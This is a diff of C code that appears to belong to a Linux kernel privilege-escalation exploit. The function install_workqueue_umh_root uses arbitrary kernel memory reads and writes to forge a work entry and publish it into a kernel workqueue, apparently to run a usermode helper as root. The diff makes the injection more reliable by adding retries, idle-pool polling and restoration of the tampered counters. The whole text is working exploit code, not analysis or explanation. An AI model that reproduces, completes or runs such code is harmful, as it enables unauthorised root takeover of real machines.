@@ -417,53 +417,87 @@ static int install_workqueue_umh_root(int fd) {
     }
   }
 
-  if (!root_read64(fd, worklist, &list_next) ||
-      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
-      list_next != worklist || list_prev != worklist) {
-    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
-             (unsigned long long)list_next,
-             (unsigned long long)list_prev);
-    goto cleanup;
-  }
+  int inject_attempt;
+  for (inject_attempt = 1; inject_attempt <= 8; inject_attempt++) {
+    for (int idle_i = 0; idle_i < 200; idle_i++) {
+      if (!root_read64(fd, worklist, &list_next) ||
+          !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
+          !root_read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle) ||
+          !root_read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) ||
+          !root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active) ||
+          !root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) ||
+          !root_read32(fd, inflight_addr, &nr_inflight))
+        break;
+      if (list_next == worklist && list_prev == worklist && nr_idle > 0 &&
+          refcnt > 0 && refcnt != UINT32_MAX && max_active != 0 &&
+          nr_active < max_active && nr_inflight != UINT32_MAX)
+        break;
+      usleep(1000);
+    }
+    if (list_next != worklist || list_prev != worklist) {
+      pr_warning("root umh inject attempt=%d/%d pool not idle "
+                 "next=%016llx prev=%016llx idle=%u\n",
+                 inject_attempt, 8,
+                 (unsigned long long)list_next,
+                 (unsigned long long)list_prev, nr_idle);
+      if (inject_attempt < 8) { usleep(10000); continue; }
+      goto cleanup;
+    }
 
-  inflight_changed = 1;
-  int inflight_write = root_write32_exact(
-      fd, inflight_addr, nr_inflight + 1);
-  active_changed = 1;
-  int active_write = inflight_write && root_write32_exact(
-      fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
-  refcnt_changed = 1;
-  int refcnt_write = active_write && root_write32_exact(
-      fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
-  list_prev_changed = 1;
-  int list_prev_write = refcnt_write && root_write64_exact(
-      fd, worklist + sizeof(uint64_t), fake_entry);
-  if (!list_prev_write ||
-      !root_read64(fd, worklist, &list_next) || list_next != worklist) {
-    pr_error("root umh prepublish write failed counters=%d/%d/%d prev=%d next=%016llx\n",
-             inflight_write, active_write, refcnt_write, list_prev_write,
-             (unsigned long long)list_next);
-    goto cleanup;
-  }
+    inflight_changed = 1;
+    int inflight_write = root_write32_exact(
+        fd, inflight_addr, nr_inflight + 1);
+    active_changed = 1;
+    int active_write = inflight_write && root_write32_exact(
+        fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1);
+    refcnt_changed = 1;
+    int refcnt_write = active_write && root_write32_exact(
+        fd, pwq + PWQ_REFCNT_OFF, refcnt + 1);
+    list_prev_changed = 1;
+    int list_prev_write = refcnt_write && root_write64_exact(
+        fd, worklist + sizeof(uint64_t), fake_entry);
+    if (!list_prev_write ||
+        !root_read64(fd, worklist, &list_next) || list_next != worklist) {
+      pr_warning("root umh inject attempt=%d/%d prepublish failed "
+                 "counters=%d/%d/%d prev=%d next=%016llx\n",
+                 inject_attempt, 8,
+                 inflight_write, active_write, refcnt_write,
+                 list_prev_write, (unsigned long long)list_next);
+      root_restore64(fd, worklist + sizeof(uint64_t), fake_entry, worklist);
+      root_restore32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
+      root_restore32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
+      root_restore32(fd, inflight_addr, nr_inflight + 1, nr_inflight);
+      inflight_changed = active_changed = refcnt_changed = list_prev_changed = 0;
+      if (inject_attempt < 8) { usleep(20000); continue; }
+      goto cleanup;
+    }
 
-  int list_next_write = root_write64(fd, worklist, fake_entry);
-  uint64_t published_next = 0;
-  if (list_next_write ||
-      (root_read64(fd, worklist, &published_next) &&
-       published_next == fake_entry)) {
-    published = 1;
-  } else {
-    pr_error("root umh publish failed ret=%d next=%016llx\n",
-             list_next_write, (unsigned long long)published_next);
-    goto cleanup;
+    int list_next_write = root_write64(fd, worklist, fake_entry);
+    uint64_t published_next = 0;
+    if (list_next_write ||
+        (root_read64(fd, worklist, &published_next) &&
+         published_next == fake_entry)) {
+      published = 1;
+    } else {
+      pr_warning("root umh inject attempt=%d/%d publish failed ret=%d "
+                 "next=%016llx\n",
+                 inject_attempt, 8,
+                 list_next_write, (unsigned long long)published_next);
+      root_restore64(fd, worklist + sizeof(uint64_t), fake_entry, worklist);
+      root_restore32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1, refcnt);
+      root_restore32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1, nr_active);
+      root_restore32(fd, inflight_addr, nr_inflight + 1, nr_inflight);
+      inflight_changed = active_changed = refcnt_changed = list_prev_changed = 0;
+      if (inject_attempt < 8) { usleep(20000); continue; }
+      goto cleanup;
+    }
+    break;
   }
   pr_info("root umh queued wq=%016zx pwq=%016zx pool=%016zx "
           "work=%016zx entry=%016zx color=%u counters=%u/%u/%u "
-          "writes=%d/%d/%d/%d/%d/%d/%d\n",
+          "inject_attempt=%d\n",
           wq, pwq, pool, fake_work_addr, fake_entry, color,
-          nr_inflight, nr_active, refcnt, data_write, work_write,
-          inflight_write, active_write, refcnt_write,
-          list_prev_write, list_next_write);
+          nr_inflight, nr_active, refcnt, inject_attempt);
 
   int wake_ok = 0;
   for (int i = 0; i < 8 && !complete_done; i++) {
